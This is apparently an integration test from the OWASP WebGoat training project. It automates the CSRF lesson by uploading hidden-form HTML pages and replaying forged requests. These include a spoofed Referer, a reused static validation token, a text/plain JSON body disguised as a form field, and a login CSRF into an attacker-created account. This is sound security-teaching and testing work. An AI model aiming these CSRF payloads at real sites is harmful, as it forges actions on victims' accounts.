/*
 * SPDX-FileCopyrightText: Copyright © 2019 WebGoat authors
 * SPDX-License-Identifier: GPL-2.0-or-later
 */
package org.owasp.webgoat.integration

import io.restassured.RestAssured
import io.restassured.http.ContentType
import org.assertj.core.api.Assertions.assertThat
import org.junit.jupiter.api.AfterEach
import org.junit.jupiter.api.Assertions.assertTrue
import org.junit.jupiter.api.BeforeEach
import org.junit.jupiter.api.DynamicTest
import org.junit.jupiter.api.DynamicTest.dynamicTest
import org.junit.jupiter.api.TestFactory
import org.owasp.webgoat.container.lessons.Assignment
import java.nio.file.Files
import java.nio.file.Paths

class CSRFIntegrationTest : IntegrationTest() {
    companion object {
        private const val TRICK_HTML3 = """<!DOCTYPE html><html><body><form action="WEBGOATURL" method="POST">
<input type="hidden" name="csrf" value="thisisnotchecked"/>
<input type="submit" name="submit" value="assignment 3"/>
</form></body></html>"""

        private const val TRICK_HTML4 = """<!DOCTYPE html><html><body><form action="WEBGOATURL" method="POST">
<input type="hidden" name="reviewText" value="hoi"/>
<input type="hidden" name="starts" value="3"/>
<input type="hidden" name="validateReq" value="2aa14227b9a13d0bede0388a7fba9aa9"/>
<input type="submit" name="submit" value="assignment 4"/>
</form>
</body></html>"""

        private const val TRICK_HTML7 = """<!DOCTYPE html><html><body><form action="WEBGOATURL" enctype='text/plain' method="POST">
<input type="hidden" name='{"name":"WebGoat","email":"webgoat@webgoat.org","content":"WebGoat is the best!!' value='"}' />
<input type="submit" value="assignment 7"/>
</form></body></html>"""

        private const val TRICK_HTML8 = """<!DOCTYPE html><html><body><form action="WEBGOATURL" method="POST">
<input type="hidden" name="username" value="csrf-USERNAME"/>
<input type="hidden" name="password" value="password"/>
<input type="hidden" name="matchingPassword" value="password"/>
<input type="hidden" name="agree" value="agree"/>
<input type="submit" value="assignment 8"/>
</form></body></html>"""
    }

    private var webwolfFileDir: String = ""

    @BeforeEach
    fun init() {
        startLesson("CSRF")
        webwolfFileDir = getWebWolfFileServerLocation()
        uploadTrickHtml("csrf3.html", TRICK_HTML3.replace("WEBGOATURL", webGoatUrlConfig.url("csrf/basic-get-flag")))
        uploadTrickHtml("csrf4.html", TRICK_HTML4.replace("WEBGOATURL", webGoatUrlConfig.url("csrf/review")))
        uploadTrickHtml("csrf7.html", TRICK_HTML7.replace("WEBGOATURL", webGoatUrlConfig.url("csrf/feedback/message")))
        uploadTrickHtml(
            "csrf8.html",
            TRICK_HTML8.replace("WEBGOATURL", webGoatUrlConfig.url("login")).replace("USERNAME", user),
        )
    }

    @TestFactory
    fun testCSRFLesson(): Iterable<DynamicTest> =
        listOf(
            dynamicTest("assignment 3") { checkAssignment3(callTrickHtml("csrf3.html")) },
            dynamicTest("assignment 4") { checkAssignment4(callTrickHtml("csrf4.html")) },
            dynamicTest("assignment 7") { checkAssignment7(callTrickHtml("csrf7.html")) },
            dynamicTest("assignment 8") { checkAssignment8(callTrickHtml("csrf8.html")) },
        )

    @AfterEach
    fun shutdown() {
        // logout();
        login() // because old cookie got replaced and invalidated
        startLesson("CSRF", false)
        checkResults("CSRF")
    }

    private fun uploadTrickHtml(
        htmlName: String,
        htmlContent: String,
    ) {
        // remove any left over html
        val webWolfFilePath = Paths.get(webwolfFileDir)
        if (webWolfFilePath.resolve(Paths.get(user, htmlName)).toFile().exists()) {
            Files.delete(webWolfFilePath.resolve(Paths.get(user, htmlName)))
        }

        // upload trick html
        RestAssured
            .given()
            .`when`()
            .relaxedHTTPSValidation()
            .cookie("WEBWOLFSESSION", webWolfCookie)
            .multiPart("file", htmlName, htmlContent.toByteArray())
            .post(webWolfUrlConfig.url("fileupload"))
            .then()
            .extract()
            .response()
            .body
            .asString()
    }

    private fun callTrickHtml(htmlName: String): String {
        var result =
            RestAssured
                .given()
                .`when`()
                .relaxedHTTPSValidation()
                .cookie("JSESSIONID", webGoatCookie)
                .cookie("WEBWOLFSESSION", webWolfCookie)
                .get(webWolfUrlConfig.url("files/$user/$htmlName"))
                .then()
                .extract()
                .response()
                .body
                .asString()
        result = result.substring(8 + result.indexOf("action=\""))
        result = result.substring(0, result.indexOf("\""))
        return result
    }

    private fun checkAssignment3(goatURL: String) {
        val flag: String =
            RestAssured
                .given()
                .`when`()
                .relaxedHTTPSValidation()
                .cookie("JSESSIONID", webGoatCookie)
                .header("Referer", webWolfUrlConfig.url("files/fake.html"))
                .post(goatURL)
                .then()
                .extract()
                .path<String>("flag")

        val params = mutableMapOf<String, Any>()
        params["confirmFlagVal"] = flag
        checkAssignment(webGoatUrlConfig.url("csrf/confirm-flag-1"), params, true)
    }

    private fun checkAssignment4(goatURL: String) {
        val params = mutableMapOf<String, Any>()
        params["reviewText"] = "test review"
        params["stars"] = "5"
        params["validateReq"] = "2aa14227b9a13d0bede0388a7fba9aa9" // always the same token is the weakness

        val result: Boolean =
            RestAssured
                .given()
                .`when`()
                .relaxedHTTPSValidation()
                .cookie("JSESSIONID", webGoatCookie)
                .header("Referer", webWolfUrlConfig.url("files/fake.html"))
                .formParams(params)
                .post(goatURL)
                .then()
                .extract()
                .path("lessonCompleted")
        assertTrue(result)
    }

    private fun checkAssignment7(goatURL: String) {
        var flag: String =
            RestAssured
                .given()
                .`when`()
                .relaxedHTTPSValidation()
                .cookie("JSESSIONID", webGoatCookie)
                .header("Referer", webWolfUrlConfig.url("files/fake.html"))
                .contentType(ContentType.TEXT)
                .body("{\"name\":\"WebGoat\",\"email\":\"webgoat@webgoat.org\",\"content\":\"WebGoat is the best!!=\"}")
                .post(goatURL)
                .then()
                .extract()
                .asString()
        flag = flag.substring(9 + flag.indexOf("flag is:"))
        flag = flag.substring(0, flag.indexOf("\""))

        val params = mutableMapOf<String, Any>()
        params["confirmFlagVal"] = flag
        checkAssignment(webGoatUrlConfig.url("csrf/feedback"), params, true)
    }

    private fun checkAssignment8(goatURL: String) {
        // first make sure there is an attack csrf- user
        registerCSRFUser()

        val params = mutableMapOf<String, Any>()
        params["username"] = "csrf-$user"
        params["password"] = "password"

        // login and get the new cookie
        val newCookie: String =
            RestAssured
                .given()
                .`when`()
                .relaxedHTTPSValidation()
                .cookie("JSESSIONID", webGoatCookie)
                .header("Referer", webWolfUrlConfig.url("files/fake.html"))
                .params(params)
                .post(goatURL)
                .then()
                .extract()
                .cookie("JSESSIONID")

        // select the lesson
        RestAssured
            .given()
            .`when`()
            .relaxedHTTPSValidation()
            .cookie("JSESSIONID", newCookie)
            .get(webGoatUrlConfig.url("CSRF.lesson.lesson"))
            .then()
            .statusCode(200)

        // click on the assignment
        val result: Boolean =
            RestAssured
                .given()
                .`when`()
                .relaxedHTTPSValidation()
                .cookie("JSESSIONID", newCookie)
                .post(webGoatUrlConfig.url("csrf/login"))
                .then()
                .statusCode(200)
                .extract()
                .path("lessonCompleted")

        assertThat(result).isTrue()

        login()
        startLesson("CSRF", false)

        val assignments: Array<Overview> =
            RestAssured
                .given()
                .cookie("JSESSIONID", webGoatCookie)
                .relaxedHTTPSValidation()
                .get(webGoatUrlConfig.url("service/lessonoverview.mvc/CSRF"))
                .then()
                .extract()
                .jsonPath()
                .getObject("$", Array<Overview>::class.java)
        assertThat(assignments)
            .filteredOn { it.assignment?.name == "CSRFLogin" }
            .extracting<Boolean> { it.solved }
            .containsExactly(true)
    }

    data class Overview(
        val assignment: Assignment? = null,
        val solved: Boolean = false,
    )

    /** Try to register the new user. Ignore the result. */
    private fun registerCSRFUser() {
        RestAssured
            .given()
            .`when`()
            .relaxedHTTPSValidation()
            .formParam("username", "csrf-$user")
            .formParam("password", "password")
            .formParam("matchingPassword", "password")
            .formParam("agree", "agree")
            .post(webGoatUrlConfig.url("register.mvc"))
    }
}
